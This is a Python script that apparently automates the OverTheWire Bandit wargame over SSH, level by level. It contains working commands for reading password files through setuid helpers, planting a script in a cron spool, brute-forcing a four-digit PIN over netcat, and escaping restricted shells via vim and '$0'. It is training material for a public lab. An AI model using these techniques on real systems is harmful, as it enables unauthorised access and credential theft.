#!/usr/bin/env python3
import paramiko
import tempfile
import os
import time
import json
import argparse

ARCHIVE_FILE = "bandit_progress.json"

def load_archive():
    """Load archive with error handling"""
    try:
        if os.path.exists(ARCHIVE_FILE):
            with open(ARCHIVE_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"Warning: Could not load archive file: {e}")
        if os.path.exists(ARCHIVE_FILE):
            os.rename(ARCHIVE_FILE, f"{ARCHIVE_FILE}.corrupted")
    return {}

def save_archive(archive):
    """Save archive with atomic write"""
    temp_file = f"{ARCHIVE_FILE}.tmp"
    try:
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(archive, f, indent=2, ensure_ascii=False)
        os.replace(temp_file, ARCHIVE_FILE)
    except IOError as e:
        print(f"Warning: Could not save archive: {e}")
        if os.path.exists(temp_file):
            os.remove(temp_file)

def initialize_ssh(host, username, password=None, key_path=None, port=2220):
    """Initialize SSH connection with password or key authentication"""
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        if key_path:
            pkey = paramiko.RSAKey.from_private_key_file(key_path)
            client.connect(host, username=username, pkey=pkey, port=port, timeout=10)
        else:
            client.connect(host, username=username, password=password, port=port, timeout=10)
        return client
    except Exception as e:
        client.close()
        raise e

def run_command(client, command, timeout=120):
    """Execute command with improved error handling and timeout"""
    try:
        stdin, stdout, stderr = client.exec_command(f'bash -c \'{command}\'', timeout=timeout)
        
        start_time = time.time()
        while not stdout.channel.exit_status_ready():
            if time.time() - start_time > timeout:
                stdout.channel.close()
                raise TimeoutError(f"Command timed out after {timeout} seconds")
            time.sleep(0.05)
        
        result = stdout.read().decode('utf-8', errors='ignore').strip()
        error_output = stderr.read().decode('utf-8', errors='ignore').strip()
        
        if error_output and not result:
            raise Exception(f"Command failed: {error_output}")
            
        return result
    finally:
        try:
            stdin.close()
            stdout.close()
            stderr.close()
        except:
            pass

def run_command_locally(command):
    return os.popen(command).read().strip()

def bandit26_vim_exploit(client):
    """Optimized vim exploit with better timing and error handling"""
    print('Starting tiny terminal and activating Vim mode...')
    channel = client.invoke_shell(term='vt100', width=20, height=5)
    
    commands = [
        ('v', 'Activating Vim mode'),
        (':set shell=/bin/bash\r', 'Setting shell'),
        (':shell\r', 'Starting shell'),
        ('./bandit27-do cat /etc/bandit_pass/bandit27\r', 'Getting password')
    ]
    
    try:
        for i, (cmd, desc) in enumerate(commands):
            print(f'{desc}...')
            channel.send(cmd)
            time.sleep(1.5 if i < 3 else 2)
            
            if i == 2:
                while channel.recv_ready():
                    channel.recv(4096)
        
        output = ""
        max_wait = 10
        start_time = time.time()
        
        while time.time() - start_time < max_wait:
            if channel.recv_ready():
                chunk = channel.recv(4096).decode('utf-8', errors='ignore')
                output += chunk
                if 'bandit27' in output.lower():
                    break
            time.sleep(0.1)
        
        lines = [line.strip() for line in output.splitlines() if line.strip()]
        for line in lines:
            if len(line) == 32 and line.isalnum():
                return line
        
        return lines[2] if len(lines) > 2 else lines[-1]
        
    finally:
        channel.close()

def bandit32_shellescape(client):
    """Optimized shell escape with better output parsing"""
    channel = client.invoke_shell(term='vt100')
    
    try:
        time.sleep(1)
        print('Escaping bashjail...')
        channel.send('$0\n')
        time.sleep(2)
        
        while channel.recv_ready():
            channel.recv(4096)
        
        print('Getting password...')
        channel.send('cat /etc/bandit_pass/bandit33\n')
        time.sleep(2)
        
        output = ""
        max_wait = 10
        start_time = time.time()
        
        while time.time() - start_time < max_wait:
            if channel.recv_ready():
                chunk = channel.recv(4096).decode('utf-8', errors='ignore')
                output += chunk
                if len(chunk.strip()) == 32 and chunk.strip().isalnum():
                    return chunk.strip()
            time.sleep(0.1)
        
        lines = [line.strip() for line in output.splitlines() if line.strip()]
        for line in lines:
            if len(line) == 32 and line.isalnum():
                return line
                
        return lines[1] if len(lines) > 1 else lines[0] if lines else ""
        
    finally:
        channel.close()

def create_temp_key(key_content):
    """Create temporary key file with proper cleanup"""
    if not key_content or not key_content.strip():
        raise ValueError("Key content is empty")
    
    try:
        temp_file = tempfile.NamedTemporaryFile(mode="w+", delete=False, 
                                               encoding='utf-8', prefix='bandit_key_')
        temp_file.write(key_content.strip())
        temp_file.flush()
        temp_file.close()
        os.chmod(temp_file.name, 0o600)
        return temp_file.name
    except Exception as e:
        raise ValueError(f"Failed to create temp key file: {e}")

def get_commands():
    return [
        'cat readme | grep "password" | sed "s/.* //"', # 0->1
        'cat ./-', # 1->2
        'cat ./--spaces\\ in\\ this\\ filename--', # 2->3
        'cat inhere/...Hiding-From-You', # 3->4
        'cat $(file inhere/* | grep ": ASCII" | sed "s/: .*//")', # 4->5
        'find . -type f ! -executable -size 1033c -exec cat {} \\; | tr -d "[:space:]"', # 5->6
        'find / -group bandit6 -user bandit7 -size 33c -exec cat {} \\; 2>/dev/null', # 6->7
        'cat data.txt | grep "millionth" | sed "s/millionth[[:space:]]*//"', # 7->8
        'cat data.txt | sort | uniq -u', # 8->9
        'strings data.txt | grep "==" | tail -1 | sed "s/=* //"', # 9->10
        'cat data.txt | base64 -d | sed "s/.* //"', # 10->11
        'cat data.txt | tr "A-Za-z" "N-ZA-Mn-za-m" | sed "s/.* //g"', # 11->12
        'cat data.txt | xxd -r | gunzip -d | bzip2 -d | tar xzOf - | tar xOf - | bzip2 -d | tar xOf - | gunzip -d | sed "s/.* //g"', # 12->13
        'cat sshkey.private', # 13->14
        'cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed "/^[[:space:]]*$/d" | tail -1', # 14->15
        'cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed "/^[[:space:]]*$/d" | tail -1 | openssl s_client -connect localhost:30001 -ign_eof -quiet | sed "/^[[:space:]]*$/d" | tail -1', # 15->16
        '''nmap -T5 -p31000-32000 localhost | grep "/tcp" | cut -d"/" -f1 | xargs -I {} sh -c "cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed \\\"/^[[:space:]]*$/d\\\" | tail -1 | openssl s_client -connect localhost:30001 -ign_eof -quiet | sed \\\"/^[[:space:]]*$/d\\\" | tail -1 | timeout 2 openssl s_client -connect localhost:{} -ign_eof -quiet" | sed "1,/Correct/d"''', # 16->17
        'diff passwords.old passwords.new | tail -1 | cut -c3-', # 17->18
        'cat readme', # 18->19
        './bandit20-do cat /etc/bandit_pass/bandit20 | tee /tmp/bandit20_pass_sealldev', # 19->20
        '''PASS=$(cat /tmp/bandit20_pass_sealldev);mkfifo /tmp/pipe$$ && (echo "$PASS" > /tmp/pipe$$ &) && timeout 2 nc -lvnp 1337 < /tmp/pipe$$ 2>/dev/null & sleep 0.2 && ./suconnect 1337 > /dev/null 2>/dev/null && rm -f /tmp/pipe$$''', # 20->21
        'cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv', # 21->22
        'cat /tmp/8ca319486bfbbc3663ea0fbe81326349', # 22->23
        '''rm /tmp/bandit$$.sh 2>/dev/null; echo "#!/bin/bash" > /tmp/bandit$$.sh; echo "cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass_sealldev" >> /tmp/bandit$$.sh; chmod +x /tmp/bandit$$.sh; cp /tmp/bandit$$.sh /var/spool/bandit24/foo/bandit$$.sh; counter=0; while [ ! -e "/tmp/bandit24_pass_sealldev" ] && [ $counter -lt 600 ]; do sleep 0.1; counter=$((counter + 1)); done; if [ -e "/tmp/bandit24_pass_sealldev" ]; then cat /tmp/bandit24_pass_sealldev; else echo "TIMEOUT"; fi''', # 23->24
        '''PASS=$(cat /tmp/bandit24_pass_sealldev); for i in {0000..9999}; do echo "$PASS $i"; done | nc localhost 30002 >> /tmp/out$$; cat /tmp/out$$ | grep "user bandit25 is" | sed "s/.* //g" | uniq''', # 24->25
        'cat bandit26.sshkey', # 25->26
        'Custom Vim Script', # VIM 26->27
        '''expect -c "spawn git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo /tmp/bandit27_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof" >/dev/null 2>&1 && cat /tmp/bandit27_repo/README | sed "s/.* //g" && rm -rf /tmp/bandit27_repo''', # 27->28
        '''expect -c "spawn git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo /tmp/bandit28_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit28_repo && git reset --hard 68314e012fbaa192abfc9b78ac369c82b75fab8f && cat README.md | grep password | sed 's/.* //g' && cd / && rm -rf /tmp/bandit28_repo\\"; expect eof" | tail -1''', # 28->29
        '''expect -c "spawn git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo /tmp/bandit29_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit29_repo && git switch dev && cat README.md | grep password | sed 's/.* //g' && cd / && rm -rf /tmp/bandit29_repo\\"; expect eof" | tail -1''', # 29->30
        '''expect -c "spawn git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo /tmp/bandit30_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit30_repo && git cat-file -p 84368f3a7ee06ac993ed579e34b8bd144afad351 && cd / && rm -rf /tmp/bandit30_repo\\"; expect eof" | tail -1''', # 30->31
        '''expect -c "spawn git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo /tmp/bandit31_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit31_repo && rm .gitignore && echo 'May I come in?' > key.txt && git add . && git commit -am 'key' && git push\\"; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd / && rm -rf /tmp/bandit31_repo\\"; expect eof" | grep 'remote: ' | sed "s/remote: //g" | sed '/.* .*/!d' | tail -1 | sed $'s,\\x1b\\\\[[0-9;]*[a-zA-Z],,g';''', # 31->32
        'Bash Jail Escape' #bash jail 32->33
    ]

def solve_level(level, password, key_path=None):
    """Solve a specific bandit level with optimized connection logic"""
    commands = get_commands()
    host = "bandit.labs.overthewire.org"
    port = 2220
    
    username_map = {17: f"bandit{level}", 26: "bandit26"}
    username = username_map.get(level, "bandit14" if level in [14, 15, 16] else f"bandit{level}")
    
    auth_password = password
    auth_key_path = key_path
    
    if level == 32:
        archive = load_archive()
        auth_password = archive[str(level-1)]['password']
        print(f"Using level 31 password for SSH: {auth_password}")
        auth_key_path = None
    elif level in [14, 15, 16, 17, 26]:
        auth_password = None
    
    for attempt in range(3):
        client = None
        try:
            print(f"⚡︎ Level {level} (attempt {attempt + 1})...")
            print(f"⟳ Command: `{commands[level]}`")
            
            client = initialize_ssh(host, username, auth_password, auth_key_path, port)
            
            if level == 26:
                result = bandit26_vim_exploit(client)
            elif level == 32:
                result = bandit32_shellescape(client)
            elif level in [27, 28, 29, 30, 31]:
                archive = load_archive()
                prev_password = archive[str(level-1)]['password']
                print(f"Using previous password: {prev_password}")
                local_command = commands[level].replace("PREVPASSWORD", prev_password)
                result = run_command_locally(local_command)
            else:
                result = run_command(client, commands[level], timeout=180)
            
            if result and result.strip():
                print(f"    ★ Found {level}->{level+1} password: {result}\n")
                
                if level == 25:
                    print(f"    → SSH Key length: {len(result)} characters")
                    if not result.startswith('-----BEGIN'):
                        print(f"    ⚠ Warning: Key doesn't start with -----BEGIN")
                
                return result
            else:
                print(f"    ✗ Empty result on attempt {attempt + 1}")
                
        except Exception as e:
            print(f"    ✗ Attempt {attempt + 1} failed: {e}")
        finally:
            if client:
                try:
                    client.close()
                except:
                    pass
            
        if attempt < 2:
            time.sleep(2 ** attempt)
    
    raise Exception(f"Level {level} failed after 3 attempts")

def main():
    parser = argparse.ArgumentParser(description='Bandit CTF Solver')
    parser.add_argument('--start', type=int, default=0, help='Start at specific level (default: 0)')
    parser.add_argument('--password', type=str, help='Password for start level')
    parser.add_argument('--key', type=str, help='SSH key file path for start level')
    args = parser.parse_args()
    
    archive = load_archive()
    commands = get_commands()
    
    if args.start > 0:
        if args.password:
            password = args.password
        elif args.key:
            password = None
        elif str(args.start) in archive:
            stored = archive[str(args.start)]
            password = stored.get('password') or stored.get('key')
            if not password:
                print(f"No password/key found for level {args.start} in archive")
                return
        else:
            print(f"Level {args.start} not found in archive. Use --password or --key")
            return
        
        print(f"Starting from level {args.start}")
        if args.key:
            print(f"Using key file: {args.key}")
        else:
            print(f"Using password: {password}")
    else:
        password = "bandit0"
    
    key_path = args.key
    
    temp_keys_to_cleanup = []
    
    try:
        for level in range(args.start, len(commands)):
            if level in [14, 15, 16, 17, 26]:
                if not key_path or not os.path.exists(key_path):
                    if level == 26 and str(25) in archive:
                        key_content = archive[str(25)].get('key', password)
                    else:
                        key_content = password
                    key_path = create_temp_key(key_content)
                    if not args.key:
                        temp_keys_to_cleanup.append(key_path)
            
            try:
                password = solve_level(level, password, key_path)
                
                is_key = level in [13, 17, 25]
                entry = {
                    'level': level,
                    'timestamp': time.time(),
                    ('key' if is_key else 'password'): password
                }
                archive[str(level)] = entry
                save_archive(archive)
                
            except Exception as e:
                print(f"Failed at level {level}: {e}")
                break
            
            if level in [16, 17, 26] and key_path in temp_keys_to_cleanup:
                try:
                    os.remove(key_path)
                    temp_keys_to_cleanup.remove(key_path)
                except OSError:
                    pass
                key_path = None
                
    finally:
        for temp_key in temp_keys_to_cleanup:
            try:
                if os.path.exists(temp_key):
                    os.remove(temp_key)
            except OSError:
                pass

if __name__ == "__main__":
    main()